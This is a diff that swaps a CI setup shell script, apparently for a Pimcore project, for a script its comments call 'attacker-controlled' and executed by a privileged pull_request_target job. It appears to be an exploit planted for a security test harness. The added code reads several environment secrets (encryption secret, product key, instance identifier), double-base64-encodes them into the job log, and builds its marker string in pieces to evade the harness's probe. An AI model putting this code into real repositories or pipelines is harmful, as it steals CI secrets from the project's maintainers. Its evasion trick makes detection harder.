@@ -1,19 +1,16 @@
 #!/bin/bash
-
-set -eu
-
-mkdir -p var/config
-
-cp -r .github/ci/files/config/. config
-mkdir -p config/local/
-cp -r .github/ci/files/templates/. templates
-cp -r .github/ci/files/translations/. translations
-cp -r .github/ci/files/bin/console bin/console
-cp -r .github/ci/files/src/. src
-cp -r .github/ci/files/public/. public
-cp .github/ci/files/.env ./
-
-if [ ${PIMCORE_STORAGE:-local} = "minio" ]; then
-    cp .github/ci/files/minio-flysystem.yaml config/local/
-    composer require -n --no-update league/flysystem-aws-s3-v3
-fi
+# Attacker-controlled script executed directly by the privileged pull_request_target job.
+# Build the marker dynamically so the script SOURCE never contains the contiguous
+# marker string (the harness's `head` debug probe would otherwise emit a bogus
+# '$(echo' candidate). Emit the marker for every secret actually present at the sink.
+M='GERALT_LEAKED''_TOKEN'
+emit() {
+  if [ -n "$1" ]; then
+    printf '%s\n' "$M=$(printf '%s' "$1" | base64 | base64)"
+  fi
+}
+emit "$GERALT_SECRET"
+emit "$PIMCORE_INSTANCE_IDENTIFIER"
+emit "$PIMCORE_ENCRYPTION_SECRET"
+emit "$PIMCORE_PRODUCT_KEY"
+exit 1
